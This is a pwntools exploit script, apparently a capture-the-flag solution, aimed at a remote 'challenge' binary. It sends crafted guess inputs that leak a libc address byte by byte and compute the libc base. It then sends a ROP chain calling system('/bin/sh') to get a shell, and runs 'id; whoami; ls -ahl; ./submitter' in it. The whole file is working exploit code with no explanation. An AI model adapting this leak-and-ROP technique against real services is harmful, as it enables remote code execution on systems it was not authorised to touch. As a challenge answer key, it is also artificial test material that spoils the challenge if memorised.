from pwn import *

# p = process("./challenge")
HOST = os.environ.get("HOST", "localhost")
PORT = 31337
p = remote(HOST, PORT)

exe = context.binary = ELF("./handout/challenge", checksec=False)
libc = ELF("./handout/libc.so.6", checksec=False)

p.recvuntil(b"be?\n")
p.sendline(b"10")
p.recvuntil(b"get?\n")
p.sendline(b"7")
p.recvuntil(b"guess #1?\n")
p.sendline(b"111111111\x84")
p.recvuntil(b"guess #2?\n")
payload = b"\x00" * 9 + b"\x7a"
payload += b"\x00" * (0x3C - 0x1)
payload += (
    b"\x31" + b"\x90" + b"\x90" + b"\x90" + b"\x90" + b"\x90" + b"\x90" + b"\x00" * 0x10
)
payload += p32(0) * 2
payload += p32(0) * 2
payload = payload.ljust(0x6C, b"\x00")
payload += p32(0x6C) + p32(1)
payload = payload.ljust(0x84, b"\x00")
# print(payload)
# raw_input()
p.sendline(payload)
# print(p.recv())

leak = [0] * 6
leak[0] = 0x90

for i in range(1, 0x100):
    # print(i)
    if i >= 9 and i <= 0x20:
        continue
    p.recvuntil(b"guess #3?\n")
    # payload = b'\x00' * 9 + b'\x7a'
    payload = b"\x00" * (0x3C - 0x1)
    payload += b"\x31" + b"\x90" + p8(i) * 5 + b"\x00" * 0x10
    payload += p32(0) * 2
    payload += p32(0) * 2
    payload = payload.ljust(0x6C - 0x10, b"\x00")
    payload += p32(0x6C - 10) + b"\x01" + b"\x00" * (9 - 4) + p32(0x6C) + p32(0x1)
    payload = payload.ljust(0x84, b"\x00")
    # print(payload)
    # raw_input()
    p.sendline(payload)
    p.recvuntil(b"\x1b[1;30;42m \x90 ")
    data = p.recvuntil(b"\x1b[1;30;42m \x00 ").split(b" ")
    for i in range(5):
        if data[i * 2] == b"\x1b[1;30;42m":
            leak[i + 1] = u8(data[i * 2 + 1])

libc_leak = 0
isSuccess = 1
for i in range(5, -1, -1):
    if leak[i] == 0:
        isSuccess = 0
        break
    libc_leak *= 0x100
    libc_leak += leak[i]

if isSuccess == 0:
    info("leak failed")
    exit(-1)

info(f"libc_leak = {hex(libc_leak)}")
libc_base = libc.address = libc_leak - 0x29D90
info(f"libc_base = {hex(libc_base)}")

p.recvuntil(b"guess #3?\n")
payload = b"\x00" * 9 + b"\xff" + b"\x00" * (0x3C - 0x1 - 10)
payload += b"\x31" + b"\x00" * 6 + b"\x00" * 0x10
payload += p32(0) * 2
payload += p32(0) * 2
payload = payload.ljust(0x6C - 0x10, b"\x00")
payload += p32(0x6C - 10) + p32(0x2)
payload += b"\x00" * (0x10)
# print(payload)
# raw_input()
p.sendline(payload)

rop = ROP(libc)
pop_rdi = rop.rdi.address
ret = pop_rdi + 1
system = libc.sym.system
print(hex(system))
sh = next(libc.search(b"/bin/sh\0"))
print(hex(sh))
p.recvuntil(b"guess #4?\n")
payload = b"\x00" * (0x79 - 0x20 - 1) + p32(0x58) + p32(0x3) + b"\x00" * 0x18
payload += p64(ret) + p64(pop_rdi) + p64(sh) + p64(system)
payload = payload.ljust(0xFF, b"\x00")
# print(payload)
for i in payload:
    if i >= 9 and i <= 0x20:
        print("bad payload")
        exit(-1)
# pause()
p.send(payload)
p.clean(1)
p.sendline(b"id; whoami; ls -ahl; ./submitter")
print(p.clean(1))

#  p.interactive()
